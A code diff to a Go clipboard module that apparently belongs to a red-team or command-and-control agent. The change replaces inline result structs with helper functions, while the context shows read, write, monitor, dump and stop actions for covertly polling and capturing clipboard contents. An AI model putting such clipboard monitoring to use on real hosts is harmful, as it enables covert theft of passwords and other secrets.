@@ -30,11 +30,7 @@ type ClipboardParams struct {
 func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
 	var params ClipboardParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	switch params.Action {
@@ -42,11 +38,7 @@ func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
 		return readClipboard()
 	case "write":
 		if params.Data == "" {
-			return structs.CommandResult{
-				Output:    "Error: 'data' parameter is required for write action",
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult("Error: 'data' parameter is required for write action")
 		}
 		return writeClipboard(params.Data)
 	case "monitor":
@@ -56,11 +48,7 @@ func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
 	case "dump":
 		return clipMonitorDump()
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use 'read', 'write', 'monitor', 'dump', or 'stop')", params.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use 'read', 'write', 'monitor', 'dump', or 'stop')", params.Action)
 	}
 }
 
@@ -106,11 +94,7 @@ func clipMonitorStart(intervalSec int) structs.CommandResult {
 	cm.mu.Lock()
 	if cm.running {
 		cm.mu.Unlock()
-		return structs.CommandResult{
-			Output:    "Clipboard monitor is already running. Use 'dump' to view or 'stop' to stop.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Clipboard monitor is already running. Use 'dump' to view or 'stop' to stop.")
 	}
 
 	if intervalSec <= 0 {
@@ -128,22 +112,14 @@ func clipMonitorStart(intervalSec int) structs.CommandResult {
 
 	go clipMonitorLoop(intervalSec)
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Clipboard monitor started (polling every %ds). Use 'dump' to view captures, 'stop' to stop.", intervalSec),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Clipboard monitor started (polling every %ds). Use 'dump' to view captures, 'stop' to stop.", intervalSec)
 }
 
 func clipMonitorStop() structs.CommandResult {
 	cm.mu.Lock()
 	if !cm.running {
 		cm.mu.Unlock()
-		return structs.CommandResult{
-			Output:    "Clipboard monitor is not running",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Clipboard monitor is not running")
 	}
 
 	close(cm.stopCh)
@@ -156,22 +132,14 @@ func clipMonitorStop() structs.CommandResult {
 	cm.mu.Unlock()
 
 	output := formatClipEntries(entries, duration, true)
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 func clipMonitorDump() structs.CommandResult {
 	cm.mu.Lock()
 	if !cm.running {
 		cm.mu.Unlock()
-		return structs.CommandResult{
-			Output:    "Clipboard monitor is not running",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Clipboard monitor is not running")
 	}
 
 	duration := time.Since(cm.startTime)
@@ -180,11 +148,7 @@ func clipMonitorDump() structs.CommandResult {
 	cm.mu.Unlock()
 
 	output := formatClipEntries(entries, duration, false)
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 func clipMonitorLoop(intervalSec int) {
